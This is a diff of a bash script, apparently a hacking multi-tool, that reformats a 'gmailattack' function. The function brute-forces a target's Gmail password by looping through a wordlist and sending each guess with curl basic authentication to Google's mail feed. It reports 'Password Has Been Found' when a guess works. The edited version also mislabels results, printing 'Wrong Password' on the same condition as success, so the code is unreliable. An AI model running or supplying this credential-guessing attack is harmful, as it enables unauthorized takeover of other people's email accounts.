@@ -88,7 +88,7 @@ END="\e[0m"
 ################################################################################
 ################################################################################
 androiddebug() {
-case $(adb devices | awk '{print $2}' | sed 1d | sed '$d') in  
+case $(adb devices | awk '{print $2}' | sed 1d | sed '$d') in
     "unauthorized") echo " * You must enable usb-debugging in developer settings." ;;
 esac
 }
@@ -439,60 +439,45 @@ echo -e "=====================================================\n"
 ################################################################################
 ################################################################################
 gmailattack() {
+
 requirements_gmail() {
-if [[ -n $(curl -v &> /dev/null) ]]; then
-    echo "Curl is required for this tool, aborted."
-    exit 1
-fi
-}
+
+if [[ -n $(curl -v &> /dev/null) ]]; then echo "Curl is required for this tool, aborted."; exit 1;fi }
 
 gmail_attack() {
-if [[ -n $(curl -v &> /dev/null) ]]; then
-    echo "Curl is required for this tool, aborted."
-        exit 1
-fi
-
-read -p $'Email: ' mail
-if [[ ! "$mail" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$ ]]; then
-   echo -e "Error: email address $email is invalid, aborted."
-   exit 0
-fi
+if [[ -n $(curl -v &> /dev/null) ]]; then echo "Curl is required for this tool, aborted."; exit 1;fi; read -p $'Email: ' mail
+if [[ ! "$mail" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$ ]]; then echo -e "Error: email address $email is invalid, aborted."; exit 0;fi
 read -p $'Wordlist: ' wordlist
-if [[ ! -a $wordlist ]]; then
-   echo "Error: There is no such wordlist, aborted"
-   exit 0
-fi
+if [[ ! -a $wordlist ]]; then echo "Error: There is no such wordlist, aborted"; exit 0; fi
 
-   echo -e ""
-   echo -e "IP: $(curl -s https://nr1.nu/ip/ | sed -n '27p')"
-   echo -e "Target: $mail"
-   echo -e "Wordlist: $(pwd)/$wordlist"
-   echo -e ""
-   read -p $'If everything looks ok, type yes to begin the brute attack: (yes/no): ' ready
-if [ $ready = "yes" ]; then
-   echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
+   printf "\n"
+   printf "IP: $(curl -s https://nr1.nu/i/)\n"
+   printf "Target: $mail\n"
+   printf "Wordlist: $(pwd)/$wordlist\n\n"
+   read -p $'If everything looks ok, hit enter to start the brute attack: ' ready
+if [[ -z $ready ]]; then
+   printf "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime..\n"
 while read -r line; do
 name="$line"
 attack="$(curl -s -u $mail:$name https://mail.google.com/mail/feed/atom | grep 'xml')"
-if [ -z "$attack" ]; then
-   echo ""
-   echo -e "Wrong Password for $mail: \e[1;31m$name\e[0m"
+if [[ -n "$attack" ]]; then
+   printf "\n\nWrong Password for $mail: \e[1;31m$name\e[0m\n"
 fi
 
 if [ -n "$attack" ]; then
-   echo -e "---------------------------------------------------------------------------------------"
+   printf "%88s" | tr ' ' '-'
    echo -e  "Password Has Been Found: $name\n"
-   echo -e "---------------------------------------------------------------------------------------"
+   printf "%88s" | tr ' ' '-'
    exit
 fi
 done < "$wordlist"
-   echo -e ""
-   echo -e  "Sorry, no passwords in $wordlist matched $mail current password. "
-   echo -e   "Try your luck with another mwordlist instead..."
+   printf "\n\n"
+   printf "Sorry, no passwords in $wordlist matched $mail current password. \n\n"
+   printf "Try with another wordlist...\n\n"
    exit
 else
-   echo -e "Aborted."
-   echo -e " ---------------------------------------------------------------------------------------"
+   printf "Aborted.\n"
+   printf "%88s" | tr ' ' '-'
 fi
 }
 requirements_gmail
